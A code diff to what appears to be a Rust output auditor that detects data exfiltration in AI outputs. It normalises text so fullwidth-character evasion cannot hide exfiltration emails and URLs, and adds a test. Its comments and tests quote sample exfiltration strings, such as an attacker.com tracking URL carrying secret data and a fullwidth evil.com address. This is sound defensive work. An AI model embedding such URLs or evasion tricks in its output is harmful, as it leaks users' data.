@@ -380,7 +380,13 @@ impl OutputAuditor {
         }
 
         // 2. 外部メールアドレス検出 (exfiltration target)
-        for word in output.split_whitespace() {
+        //
+        // 全角/ホモグリフ回避対策: チェック1・7 は正規化済み `lower` を使うが、
+        // 従来このチェックは未正規化の `output` をそのまま走査しており、
+        // 同一モジュールが防ぐはずの回避手口 (全角 Unicode・ホモグリフ) が
+        // 検出対象そのもの (漏洩先メールアドレス/URL) には効かないという
+        // 非対称な欠陥があった (docs/gap-analysis.md D53)。`lower` を走査するよう統一する。
+        for word in lower.split_whitespace() {
             if word.contains('@') && word.contains('.') && is_email_like(word) {
                 findings.push(AuditFinding::ExfiltrationTarget(word.to_string()));
             }
@@ -389,10 +395,11 @@ impl OutputAuditor {
         // 3. URL クエリパラメータへのデータ埋め込み検出 (URL exfiltration)
         // 攻撃例: "Click: https://attacker.com/track?data=SECRET_INFO"
         // data= / content= / msg= / q= 等の疑わしいクエリ付き外部 URL を検出
-        for word in output.split_whitespace() {
-            let wl = word.to_lowercase();
-            if (wl.starts_with("http://") || wl.starts_with("https://"))
-                && is_suspicious_exfil_url(&wl)
+        // (D53: こちらも正規化済み `lower` を走査するよう統一。`lower` は既に
+        // 小文字化済みのため個別の to_lowercase() は不要)
+        for word in lower.split_whitespace() {
+            if (word.starts_with("http://") || word.starts_with("https://"))
+                && is_suspicious_exfil_url(word)
             {
                 findings.push(AuditFinding::ExfiltrationTarget(word.to_string()));
             }
@@ -1002,6 +1009,19 @@ mod tests {
         let output = "こちらをクリックしてください: https://attacker.com/track?data=SENSITIVE_INFO";
         let result = auditor.audit(output);
         assert!(!result.safe_to_display, "URL exfil should be flagged");
+        assert!(result.findings.iter().any(|f| matches!(f, AuditFinding::ExfiltrationTarget(_))));
+    }
+
+    /// D53: チェック2/3 が未正規化の `output` を走査しており、同モジュールが
+    /// 対策しているはずの全角 Unicode 回避が漏洩先メールアドレス/URL 自体には
+    /// 効かなかった。正規化済み `lower` を走査するよう修正したことを確認する。
+    #[test]
+    fn audit_detects_fullwidth_evasion_in_exfiltration_target() {
+        let auditor = OutputAuditor::new();
+        // 全角文字で書かれたメールアドレス (半角に正規化すれば検出可能)
+        let output = "連絡先: ｕｓｅｒ＠ｅｖｉｌ．ｃｏｍ";
+        let result = auditor.audit(output);
+        assert!(!result.safe_to_display, "全角で書かれた漏洩先アドレスも検出すべき");
         assert!(result.findings.iter().any(|f| matches!(f, AuditFinding::ExfiltrationTarget(_))));
     }
 
